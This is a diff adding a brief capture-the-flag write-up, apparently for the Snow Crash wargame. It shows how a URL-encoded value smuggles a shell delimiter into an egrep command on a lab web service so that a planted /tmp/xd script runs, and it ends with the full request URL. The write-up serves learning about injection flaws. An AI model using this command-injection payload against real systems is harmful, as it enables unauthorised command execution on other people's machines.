@@ -1,0 +1,18 @@
+This one was harder for me than it should have been.
+
+So the way to 'skip' the input 'sanitation' was to use the '/tmp/xd' in the
+execution string. Simply create a script to get the flag and share it. Then
+simply use a shell delimitor (';') and set a variable with an equal sign and
+opening double quote. So just pass this string as the x argument:
+
+lol"%3bptdr%3d"lol
+
+which means: 'lol";ptdr="lol'
+
+which turns into: 'egrep "^LOL";PTDR="LOL" /tmp/xd 2>&1'
+
+which simple executes our script
+
+just use this:
+
+<snow_crash_ip>:4646/?x=lol%22%3bptdr%3d%22lol
